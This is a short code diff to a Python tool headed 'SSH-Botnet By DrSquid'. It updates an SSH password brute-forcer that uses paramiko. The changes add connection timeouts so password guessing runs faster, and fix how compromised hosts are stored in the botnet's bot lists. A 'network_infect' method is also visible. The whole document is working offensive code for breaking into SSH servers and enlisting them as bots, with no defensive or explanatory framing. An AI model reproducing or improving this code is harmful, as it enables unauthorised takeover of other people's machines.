@@ -54,7 +54,7 @@ SSH-Botnet By DrSquid                                                           
                 client = paramiko.SSHClient()
                 client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                 passw = password.strip()
-                client.connect(ip, 22, username, passw)
+                client.connect(ip, 22, username, passw, timeout=2, auth_timeout=2)
                 print(f"\n[!] {ip}'s Password has been found!: {passw}")
                 print(f"[!] Adding {username}@{ip} to the botnet.\n")
                 self.ips.append(ip)
@@ -122,10 +122,10 @@ SSH-Botnet By DrSquid                                                           
             client.connect(ip, 22, username, password)
             print(f"\n[!] Access Granted!")
             print(f"[!] Adding {username}@{ip} to the Botnet.\n")
-            Botnet.ssh_bots.append(client)
-            Botnet.ssh_botlist.append(str(client) + ' ' + str(username))
-            Botnet.display_bots.append(f"{username}@{ip}")
-        except:
+            self.ssh_bots.append(client)
+            self.ssh_botlist.append(str(client) + ' ' + str(username))
+            self.display_bots.append(f"{username}@{ip}")
+        except Exception as e:
             print("[+] Authentication Failed. Try to check your inputs.")
     def network_infect(self, config_file=None):
         if config_file != None:
